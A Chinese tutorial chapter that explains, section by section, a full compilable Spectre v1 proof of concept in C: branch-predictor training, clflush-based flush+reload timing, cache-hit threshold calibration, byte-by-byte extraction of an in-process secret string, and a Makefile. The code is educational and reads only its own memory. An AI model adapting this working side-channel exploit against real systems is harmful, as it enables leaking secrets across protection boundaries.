---
title: Spectre v1 源码讲解
description: 逐段拆开一份可编译的 Spectre v1 实现：负偏移怎么指回秘密值、victim 四行为什么不能改、readMemoryByte 的四段各防什么、阈值为什么取几何平均。
date: '2026-11-26'
tags: [微架构安全, Spectre, 分支预测, 侧信道, 源码]
book: microarch-00-intro
---

[上一节](./microarch-04d-spectre-v1.md)从反汇编看边界检查被越过的过程，结论是“比较结果没回来之前，预测路径上的加载已经发出”。这一节把它变成一份能直接 make 的程序，逐段说明每行在做什么、为什么不能换成另一种写法。

[[toc]]

## 判据先立

这份程序要证明的不是“越界读到了”，而是“越界读到的值能从缓存状态里被还原出来”。两者的差别在于：前者一次就够，后者需要 256 个候选行稳定地分成两簇。做不到稳定，看到的就是噪声。

## 布局：负偏移为什么能指回秘密值

```c
/* spectre.c — Spectre v1 (PHT 分支预测器训练) 最小可复现实现
 * 平台: x86-64, gcc -O0（-O2 会把边界检查重排，实验失效）
 * 编译: make spectre   /   gcc -O0 -std=c99 -o spectre spectre.c
 * 用途: 在自己机器上验证"边界检查之后的投机访存把秘密带进 cache"这一事实。
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#ifdef _WIN32
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

#define ARRAY1_SIZE          16
#define ARRAY2_SIZE          (256 * 512)
#define CACHE_HIT_THRESHOLD  80
#define TRAIN_ROUNDS         30
#define TRIES                999

static uint8_t array1[ARRAY1_SIZE] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
static uint8_t array2[ARRAY2_SIZE];
static size_t  array1_size = ARRAY1_SIZE;
static uint8_t temp = 0;

/* 受害者的"秘密"：紧挨着 array1 之前放，越界负偏移即可命中 */
static const char *secret = "The Magic Words are Squeamish Ossifrage.";
```

array1 只有 16 字节，array2 是 128 KB，正好铺成 256 条 512 字节的候选行——reload 之后只扫这 256 条。

secret 是一个只读字符串，落地地址由链接器决定。程序不硬编码偏移，而是现场求差再转成 size_t：负数被解释成巨大的无符号数，`x < array1_size` 恒假，边界挡不住；而投机路径上 `array1[x]` 仍按溢出后的地址计算，读到的正是 secret 的首字节。

所以这个实验必须**在同一台机器上编译运行**。换编译器、换链接布局，偏移就变；main 里打印两个地址与差值，就是为了偏移失效时一眼看出来，而不是对着全点号的输出猜。

## victim：四行，四个决定

```c
static inline uint64_t rdtscp_ordered(void)
{
    unsigned aux;
    _mm_lfence();                    /* 阻止后续 load 提前发射 */
    uint64_t t = __rdtscp(&aux);     /* 序列化读取 TSC */
    _mm_lfence();
    return t;
}

/* 受害函数：唯一的漏洞点。array1_size 未命中时，边界检查要等内存，
 * 而分支预测器已经被训练成"总是进入 if"，于是 array1[x] 被投机读出，
 * 再用它当 array2 的下标 —— 秘密值就这样落进 cache 行。 */
static void victim(size_t x)
{
    if (x < array1_size)
        temp &= array2[array1[x] * 512];
}
```

`if (x < array1_size)` 的比较有两个操作数：x 在寄存器里，array1_size 必须从内存取。后者被 flush 掉时，比较要等内存返回，而分支已按预测方向继续取指。

预测器被前面 29 次合法调用训练成“进入 if”。第 30 次传恶意 x，预测仍走“进入”，越界读就在投机路径上发生——漏洞只在这一点上，不在别的任何一行。

`array1[x] * 512`：乘 512 让每个可能的字节值落到**不同的 cache line**。64 字节一行，512 等于跳开 8 行，reload 扫 256 个候选时不会互相污染。写成 64 就会相邻值共享行，结果糊成一片。

`temp &=` 保证这次加载有消费者。丢掉结果或写成普通赋值，编译器有权把整段投机代码删掉。victim 单独成函数、不 inline，是为了让检查与加载真实存在于两条路径上。

## readMemoryByte：四段

```c
static void readMemoryByte(size_t malicious_x, uint8_t *value, int *score)
{
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned junk = 0;
    volatile uint8_t *addr;
    uint64_t time1, time2;
    int best;

    for (i = 0; i < 256; i++) results[i] = 0;

    for (tries = TRIES; tries > 0; tries--) {
        /* 1) 清空 side channel：256 个候选 cache 行全部 flush */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);

        /* 2) 训练 + 恶意触发 */
        for (i = 0; i < TRAIN_ROUNDS; i++) {
            _mm_clflush(&array1_size);                 /* 制造边界检查的 miss 窗口 */
            for (volatile int z = 0; z < 100; z++) {}  /* 等 flush 真正完成 */
            for (j = 29; j >= 0; j--)                  /* 29 次合法训练 */
                victim((size_t)(j % ARRAY1_SIZE));
            victim(malicious_x);                       /* 紧接一次越界 */
        }

        /* 3) reload + 计时：只对 array2 的 256 个候选行计时 */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;            /* 打乱顺序，绕开硬件预取 */
            addr = &array2[mix_i * 512];
            time1 = rdtscp_ordered();
            junk = *addr;
            time2 = rdtscp_ordered() - time1;
            if ((int)time2 <= CACHE_HIT_THRESHOLD &&
                mix_i != array1[tries % ARRAY1_SIZE])
                results[mix_i]++;
        }

        /* 4) 取最高分与次高分 */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
            else if (k < 0 || results[i] >= results[k]) { k = i; }
        }
        if (results[j] >= (2 * results[k] + 5) ||
            (results[j] == 2 && results[k] == 0))
            break;                                     /* 已经足够可信 */
        best = j;
        (void)best;
    }

    results[0] ^= junk;                                /* 防止编译器把 junk 优化掉 */
    *value = (uint8_t)j;
    *score = results[j];
}
```

**清空**：256 次 clflush 覆盖全部候选行。漏一条，那条就以“本来就在缓存”的身份混进结果。

**训练**：每轮先 clflush array1_size 制造 miss 窗口，再用 volatile 空转等失效真正完成——flush 是异步的，不等就在窗口外白测。29 次合法后紧接一次恶意；比 5 次更稳，因为预测器被反复强化后跨越 flush 干扰的能力更强。

**reload**：`mix_i = (i * 167 + 13) & 255` 打乱顺序。顺序扫 256 行会被硬件 stride 预取器识别，把整片区域提前拉进缓存，所有候选都变成“命中”。junk 吸收读到的值，防止优化器删掉计时区间内的加载。

**判定**：条件里额外排除 `mix_i == array1[tries % ARRAY1_SIZE]`——那是合法训练自己留下的行，属于已知噪声源，不排除会周期性误判。

最后取最高与次高，`results[j] >= 2 * results[k] + 5` 才认；或最高 2 分而次高 0 分也认。这是信噪比门槛，不是“跑通了”。

## 标定与主循环

```c
/* 阈值标定：命中/未命中各测一批，取几何平均，比算术平均稳 */
static int calibrate_threshold(void)
{
    uint64_t t, hit_sum = 0, miss_sum = 0;
    unsigned aux;
    volatile uint8_t *p = &array2[0];

    for (int i = 0; i < 1000; i++) {                    /* 未命中 */
        _mm_clflush((void *)p);
        _mm_mfence();
        t = rdtscp_ordered();
        (void)*p;
        miss_sum += rdtscp_ordered() - t;
    }
    for (int i = 0; i < 1000; i++) {                    /* 命中 */
        (void)*p;
        _mm_mfence();
        t = rdtscp_ordered();
        (void)*p;
        hit_sum += rdtscp_ordered() - t;
    }
    double hit = (double)hit_sum / 1000.0;
    double miss = (double)miss_sum / 1000.0;
    int th = (int)((hit * miss) > 0 ? __builtin_sqrt(hit * miss) : 80);
    printf("[calib] hit=%.1f miss=%.1f geometric=%.1f -> threshold=%d\n",
           hit, miss, __builtin_sqrt(hit * miss), th);
    (void)aux;
    return th;
}

int main(void)
{
    int i, score[2] = {0, 0};
    uint8_t value[2];
    size_t malicious_x;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Spectre v1 (PHT) PoC — -O0 构建\n");

    for (i = 0; i < ARRAY2_SIZE; i++) array2[i] = 1;    /* 预热，避免缺页干扰计时 */
    printf("[calib] 参考阈值 = %d (运行期实测见上)\n", calibrate_threshold());

    printf("[info] secret @ %p, array1 @ %p, delta = %ld\n",
           (const void *)secret, (const void *)array1,
           (long)(secret - (char *)array1));

    malicious_x = (size_t)(secret - (char *)array1);    /* 负偏移，溢出成巨大 size_t */

    printf("[run ] 逐字节提取：\n");
    for (i = 0; i < (int)strlen(secret); i++) {
        readMemoryByte(malicious_x + i, &value[0], &score[0]);
        readMemoryByte(malicious_x + i, &value[1], &score[1]);
        if (score[1] > score[0]) { value[0] = value[1]; score[0] = score[1]; }
        putchar(value[0] >= 32 && value[0] < 127 ? value[0] : '.');
    }
    putchar('\n');
    return 0;
}
```

标定是纯测量段：未命中侧先 flush 再计时，命中侧连读两次只为让第一次的加载把行带进缓存；两侧各 1000 次取均值，再取几何平均。阈值本身要随机器浮动，硬编码的数字换台机器就废。

main 里三件事有顺序：先整片写一遍 array2（预热，避免缺页插进计时区间），再打印两个地址与差值（偏移失效立刻暴露），最后逐字节提取。每字节读两次、取分数高者，是最便宜的降噪——同一次投机失败不会两次都给相同的假信号。

## 阈值：为什么是几何平均

```c
int th = (int)__builtin_sqrt(hit * miss);
```

命中约 40 cycles，未命中约 250 cycles，差一个数量级。算术平均给出 145，落在两个簇之间的空白带，真正的命中会被判成未命中；几何平均 sqrt(40 × 250) ≈ 100，落在两簇中间，且对倍率变化不敏感——换台机器两个数一起变，阈值跟着走。输出形如 hit=42.3 miss=247.1 geometric=102.2 -> threshold=102，与原始论文的 80 同量级。

## 构建

```makefile
CC      ?= gcc
CFLAGS  ?= -O0 -std=c99 -fno-stack-protector -fno-pie -no-pie
LDFLAGS ?=
BINS     = spectre meltdown_probe

all: $(BINS)

spectre: spectre.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

meltdown_probe: meltdown_probe.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

run: spectre
	./spectre

clean:
	rm -f $(BINS) *.o *.exe

.PHONY: all run clean
```

`-O0` 不是保守，是必需：-O2 会把边界检查与后续加载重排，投机窗口消失。`-fno-pie -no-pie` 固定加载地址，否则每次运行基址都变，打印出来的地址没法用来核对任何东西。

```bash
make spectre && ./spectre
```

## 判定边界

这份程序只回答一个问题：这一次测量里，缓存状态能不能被外部观测到。它不回答“这是不是漏洞”——那属于判定线怎么冻结的问题，见[变体与判定](./microarch-04c-variants.md)。
